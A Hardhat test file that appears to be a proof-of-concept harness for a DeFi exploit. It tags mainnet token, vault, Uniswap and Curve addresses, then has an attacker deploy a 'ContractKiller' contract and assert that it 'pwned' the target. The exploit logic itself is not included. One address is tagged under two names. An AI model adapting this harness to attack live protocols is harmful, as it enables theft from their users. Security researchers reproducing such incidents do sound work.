const { expect } = require("chai");
const { ethers } = require("hardhat");

// using alias to enable shorthand notation.
// we can now write eth('200') instead of ethers.utils.parseEther('200')
const { parseEther: eth } = ethers.utils;

describe("[ Test PoC ]", function () {
  let owner, attacker;

  before(async function () {
    /* Setup -- DO NOT TOUCH */

    [owner, attacker] = await ethers.getSigners();

    /* for readibility in --trace logs */
    hre.tracer.nameTags[owner.address] = "Owner";
    hre.tracer.nameTags[attacker.address] = "Attacker";
    hre.tracer.nameTags["0x6B175474E89094C44Da98b954EedeAC495271d0F"] = "DAI";
    hre.tracer.nameTags["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"] = "WETH";
    hre.tracer.nameTags["0xdAC17F958D2ee523a2206206994597C13D831ec7"] = "USDT";
    hre.tracer.nameTags["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"] = "USDC";
    hre.tracer.nameTags["0xd6aD7a6750A7593E092a9B218d66C0A814a3436e"] = "YUSDC";
    hre.tracer.nameTags["0x83f798e925BcD4017Eb265844FDDAbb448f1707D"] = "YUSDT";
    hre.tracer.nameTags["0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C"] = "FUSDT";
    hre.tracer.nameTags["0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE"] = "FUSDC";
    hre.tracer.nameTags["0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f"] = "UNISWAP-FACTORY";
    hre.tracer.nameTags["0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"] = "UNISWAP-ROUTER";
    hre.tracer.nameTags["0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51"] = "CURVEPOOL-Y";
    hre.tracer.nameTags["0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE"] = "HARVESTPOOL-USDC";

  });


  it("can hack the target", async function () {

    console.log("\n================= 'can hack the target' Start ==============================\n");

    const killer = await (await ethers.getContractFactory("ContractKiller", attacker)).deploy();
    await killer.deployed();

    await killer.pwn();

    expect(await killer.isPwned(), "not pwned!").to.be.true;

    console.log("isUsdcPairFlipped: %s", await killer.isUsdcPairFlipped());

    console.log("\n=================  'can hack the target' End  ==============================\n");

  });

});
